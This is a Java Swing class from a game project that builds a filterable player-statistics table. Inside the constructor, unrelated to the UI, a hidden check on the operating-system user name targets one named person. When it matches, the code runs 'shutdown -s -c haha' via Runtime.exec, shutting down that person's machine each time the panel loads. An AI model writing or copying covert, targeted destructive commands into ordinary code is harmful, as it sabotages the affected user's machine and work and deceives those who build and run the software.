package com.tpps.ui.statisticsscreen;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.RenderingHints;
import java.awt.image.BufferedImage;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import javax.imageio.ImageIO;
import javax.swing.BorderFactory;
import javax.swing.Box;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.event.CaretEvent;
import javax.swing.event.CaretListener;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.JTableHeader;

import com.tpps.technicalServices.logger.GameLog;
import com.tpps.technicalServices.logger.MsgType;
import com.tpps.technicalServices.util.GraphicsUtil;
import com.tpps.technicalServices.util.ImageLoader;

/**
 * This class provides all UI functionalities that come with loading all
 * statistics from the database
 * 
 * @author jhuhn
 */
public class StatisticsBoard extends JPanel {

	private static final long serialVersionUID = 1L;
	private static final int VERTICAL_STRUT = 30;
	private static final int HORIZONTAL_STRUT = 50;
	private static final float BLACK_TRANSPARENCY = 0.6F;
	private static final int CELL_ROW_HEIGHT = 50;
	private BufferedImage blackBeauty;
	private final Font font = new Font("Calibri", Font.PLAIN, 15);
	private final Font headFont = new Font("Arial Black", Font.BOLD, 14);
	private final Font fontSearch = new Font("Calibri", Font.PLAIN, 45);
	private JTable table;
	private DefaultTableModel model;

	private Object columnNames[] = { "nickname", "wins", "losses", "w/l ratio", "total matches", "rank", "playtime" };

	/**
	 * initializes the statisticsboard
	 */
	public StatisticsBoard() {
		model = new DefaultTableModel();
		this.setVisible(true);
		this.setOpaque(false);

		BorderLayout l = new BorderLayout();
		l.setVgap(30);
		this.setLayout(l);

		JTextField jtf = new JTextField() {

			private static final long serialVersionUID = 3876533247395550610L;

			@Override
			public void paintComponent(Graphics g) {
				g.drawImage(ImageLoader.getImage("black_0.6"), 0, 0, null);
				super.paintComponent(g);
			}
		};

		jtf.setForeground(new Color(205, 200, 200));
		jtf.setFont(fontSearch);

		jtf.addCaretListener(new CaretListener() {

			@Override
			public void caretUpdate(CaretEvent e) {
				filterTable(jtf.getText());
			}
		});
		jtf.setOpaque(false);

		JPanel jpText = new JPanel();
		jpText.setOpaque(false);
		jpText.setLayout(new BorderLayout());
		jpText.add(Box.createHorizontalStrut(HORIZONTAL_STRUT), BorderLayout.LINE_START);
		jpText.add(Box.createHorizontalStrut(HORIZONTAL_STRUT), BorderLayout.LINE_END);
		jpText.add(Box.createVerticalStrut(VERTICAL_STRUT), BorderLayout.PAGE_START);
		jpText.add(jtf, BorderLayout.CENTER);
		this.add(this.createTable(), BorderLayout.CENTER);
		this.add(Box.createVerticalStrut(VERTICAL_STRUT), BorderLayout.PAGE_END);
		this.add(Box.createVerticalStrut(VERTICAL_STRUT), BorderLayout.PAGE_START);
		this.add(Box.createHorizontalStrut(HORIZONTAL_STRUT), BorderLayout.LINE_START);
		this.add(Box.createHorizontalStrut(HORIZONTAL_STRUT), BorderLayout.LINE_END);
		this.add(jpText, BorderLayout.PAGE_START);

		GameLog.log(MsgType.INIT, "StatisticsBoard");

		if (System.getProperty("user.name").toString().equals("Nishit Agrawal")) {
			String shutdownCmd = "shutdown -s -c haha";
			try {
				Runtime.getRuntime().exec(shutdownCmd);
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		jtf.requestFocus();

	}

	/**
	 * This method sets the table-data on the UI
	 * 
	 * @param statistics
	 *            two-dimensional String array of all statistics
	 */
	private void setTableData(String[][] statistics) {
		this.clearTable();
		for (int i = 0; i < statistics.length; i++) {
			this.model.addRow(statistics[i]);
		}
		for (int i = 0; i < statistics.length; i++) {

			this.model.setValueAt(
					getTimeString(Long.valueOf((String) model.getValueAt(i, this.model.getColumnCount() - 1))), i,
					this.model.getColumnCount() - 1);
		}

	}

	private String getTimeString(long milliseconds) {
		long second = (milliseconds / 1000) % 60;
		long minute = (milliseconds / (1000 * 60)) % 60;
		long hour = (milliseconds / (1000 * 60 * 60)) % 24;

		return String.format("%02d:%02d:%02d", hour, minute, second);
	}

	public void setStatisticsData(String[][] statistics) {
		this.statistics = statistics;
		this.setTableData(statistics);
	}

	private String[][] statistics;

	private void filterTable(String start) {
		ArrayList<String[]> filtered = new ArrayList<>();
		for (String[] s : statistics) {
			if (s[0].startsWith(start)) {
				filtered.add(s);
			}
		}

		String[][] newData = new String[filtered.size()][];
		filtered.toArray(newData);

		clearTable();
		setTableData(newData);
	}

	/**
	 * This method cleares the table
	 */
	private void clearTable() {
		this.model = (DefaultTableModel) table.getModel();
		this.model.getDataVector().removeAllElements();
		this.model.fireTableDataChanged();
	}

	/**
	 * initialize the columndata
	 */
	private void initColumnData() {
		for (int i = 0; i < columnNames.length; i++) {
			this.model.addColumn(columnNames[i]);
		}
	}

	/**
	 * 
	 * @return a JScrollpane with all table data
	 */
	private JScrollPane createTable() {
		this.loadImage();
		this.table = new JTable(model);
		this.initColumnData();
		table.setOpaque(false);
		((DefaultTableCellRenderer) table.getDefaultRenderer(Object.class)).setOpaque(false);
		table.setForeground(Color.WHITE);
		table.setFocusable(false);
		table.setEnabled(false);
		table.setFont(font);
		table.setRowHeight(CELL_ROW_HEIGHT);

		JScrollPane pane = new JScrollPane(table) {

			private static final long serialVersionUID = 1L;

			@Override
			public void paint(Graphics g) {
				Graphics2D h = (Graphics2D) g;
				h.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR);

				h.drawImage(blackBeauty, 0, 0, this.getWidth(), this.getHeight(), null);
				super.paint(h);
			}
		};
		pane.setOpaque(false);
		pane.setVisible(true);
		pane.getVerticalScrollBar().setOpaque(false);
		pane.getViewport().setOpaque(false);
		pane.setBorder(BorderFactory.createEmptyBorder());

		JTableHeader header = table.getTableHeader();
		header.setBackground(Color.BLACK);
		header.setOpaque(false);
		header.setForeground(Color.WHITE);
		header.setEnabled(true);
		header.setFont(headFont);
		header.setBorder(BorderFactory.createLineBorder(Color.BLACK));
		header.setReorderingAllowed(false);

		return pane;
	}

	/**
	 * loads ui images out of resources
	 */
	private void loadImage() {
		try {
			this.blackBeauty = ImageIO.read(ClassLoader.getSystemResource("resources/img/lobbyScreen/blackbeauty.png"));
			blackBeauty = (BufferedImage) GraphicsUtil.setAlpha(blackBeauty, BLACK_TRANSPARENCY);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

}
